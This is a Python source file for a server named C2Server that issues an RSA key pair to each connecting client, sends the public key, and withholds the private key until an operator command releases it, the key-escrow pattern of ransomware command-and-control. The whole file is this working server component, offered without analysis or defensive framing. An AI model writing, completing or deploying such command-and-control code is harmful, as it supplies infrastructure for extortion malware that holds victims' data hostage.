import socket
import threading
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_keys = {}
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"C2 server listening on {self.host}:{self.port}")

    def handle_client(self, client_socket, client_address):
        client_id = client_address[0]  # Use the client's IP address as an ID
        print(f"Connection from {client_address}, Client ID: {client_id}")
    
        # Automatically generate and register the client's keys if not already done
        if client_id not in self.client_keys:
            self.register_client(client_id)
    
        # Retrieve the public key for the client
        _, client_public_key_pem = self.client_keys[client_id]
    
        # Send the public key to the client
        try:
            print(f"Sending public key to {client_id}")
            client_socket.sendall(client_public_key_pem)
        except Exception as e:
            print(f"Failed to send public key to {client_id}: {e}")
            client_socket.close()
            return

        # Help menu text
        help_text = (
            "Available Commands:\n"
            "help - Show this help menu\n"
            "send private key <CLIENT_ID> - Send the private key to the specified client\n"
            "exit - Close the connection\n"
        )
    
        try:
            while True:
                # Server admin inputs the command in the server's console
                command = input("Enter command for client: ").strip()
    
                # Process the command
                if command.lower() == 'help':
                    print(help_text)  # Print help text to the server's console
    
                elif command.startswith("send private key"):
                    command = command.split()
                    requested_id = command[3]
                    if requested_id == client_id:
                        private_key_pem = self.get_client_private_key(requested_id)
                        if private_key_pem:
                            # Assuming you still want to send the private key to the client
                            client_socket.sendall(private_key_pem)
                            print(f"Sent private key to {client_id}")
                        else:
                            print('Private key not found.')  # Feedback in the server's console
                    else:
                        print('Not authorized.')  # Feedback in the server's console
    
                elif command.lower() == 'exit':
                    print('Connection closing.')  # Feedback in the server's console
                    break  # Exit the loop to close the connection
                
                else:
                    print('Unrecognized command. Type "help" for a list of commands.')  # Server's console feedback
    
        except Exception as e:
            print(f"Error handling client {client_address}: {e}")
    
        client_socket.close()
        print(f"Connection with Client ID: {client_id} closed.")


    def generate_keys(self):
        # Generate RSA key pair for the client
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        public_key = private_key.public_key()

        # Serialize keys
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return private_key_pem, public_key_pem

    def register_client(self, client_id):
        # Generate keys for the client
        private_key, public_key = self.generate_keys()
        
        # Store the keys associated with the client ID
        self.client_keys[client_id] = (private_key, public_key)

        return public_key

    def get_client_private_key(self, client_id):
        return self.client_keys.get(client_id, None)[0]


if __name__ == '__main__':
    c2_server = C2Server("localhost", 8888)

    try:
        while True:
            client_socket, client_address = c2_server.server_socket.accept()  # Accept a new connection
            print(f"New connection from {client_address}")

            # Start a new thread to handle the client, using the handle_client method
            client_thread = threading.Thread(target=c2_server.handle_client, args=(client_socket, client_address))
            client_thread.daemon = True  # Daemon threads will shut down with the main program
            client_thread.start()
    except KeyboardInterrupt:
        print("Server is shutting down.")
        c2_server.server_socket.close()
